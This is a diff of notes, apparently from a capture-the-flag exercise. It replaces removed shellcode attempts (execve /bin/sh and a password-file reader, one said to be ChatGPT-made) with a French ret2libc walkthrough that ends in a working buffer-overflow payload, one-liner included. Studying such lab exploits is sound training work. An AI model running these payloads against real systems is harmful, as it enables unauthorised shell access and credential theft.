@@ -1,24 +1,23 @@
-python -c 'print "\x90" * 20 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x89\xe1\xb0\x0b\xcd\x80" + "A" * 106 + "\x80\xd6\xff\xff"'
-b *0x08048763
-set follow-fork-mode child
-
-this one was made with chatgpt, but the name of the file was corrected
-echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68ssap\x68./50\x68leve\x68l/sr\x68esu/\x68emoh\x68/\x00\x00\x00\x89\xe3\x31\xc9\xb0\x05\xcd\x80\x89\xc3\x89\xe1\xb2\x00\xb0\x03\xcd\x80\x89\xc2\xb2\x00\xb0\x04\xb3\x01\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xd6\xff\xff\x80\xd6\xff\xff" |wc -c
-
-this one was taken from https://wiremask.eu/articles/shellcode-file-reader-linux-x86/, the name of the file was adjusted. It does not load properly into the program, it does not jump to the address because it does not get past gets
-echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xC9\xF7\xE1\xB0\x05\x51\x68ssap\x68./50\x68leve\x68l/sr\x68esu/\x68emoh\x68/\x00\x00\x00\x89\xE3\xCD\x80\x93\x91\xB0\x03\x66\xBA\xFF\x0F\x42\xCD\x80\x92\xB3\x01\xC1\xE8\x0A\xCD\x80\x93\xCD\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xd6\xff\xff\x80\xd6\xff\xff" >/tmp/level4 
-
-this one has a better shellcode, not from chatgpt, but the program does not take the whole thing, there are missing bytes
-
-
+On décompile le programme, on voit qu'il y a un fork, et que le parent surveille l'enfant et ses signaux. 
+Si l'enfant fait un syscall, le parent tue l'enfant. Pour passer outre cette protection, on va utiliser des 
+fonctions déjà présentes dans l'enfant. Avec gdb, on va chercher l'addresse de system :
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+Ensuite, on va chercher dans la mémoire la string "/bin/sh", et on la passe en argument à system
 (gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
 0xf7f897ec
 1 pattern found.
 (gdb) p (char *)0xf7f897ec
 $1 = 0xf7f897ec "/bin/sh"
 
-python -c 'print("A" * 156 + )'
+On utilise le site habituel pour trouver l'offset de l'adresse de retour du main de l'enfant. On trouve 156. 
+Comme on met l'adresse du système qui est appelée directement sur la stack, on n'utilise pas l'instruction call
+qui devrait mettre une adresse de retour sur la stack. On doit compenser cette différence en mettant 4 octets sur
+la stack entre l'adresse de system et l'adresse de /bin/sh
 
-[156 merde]systemBITE/bin/sh
-adress /bin/sh : 0xf7f897ec
-address system : 0xf7e6aed0
+On construit donc notre payload de la façon suivante :
+
+"a" * 156 + [adresse de system] + "a" * 4 + [adresse de "/bin/sh"]
+
+attaque :
+python -c 'print("A" * 156 + "\xd0\xae\xe6\xf7" +"A" * 4 + "\xec\x97\xf8\xf7")' > /tmp/level04 && cat /tmp/level04 - | ./level04
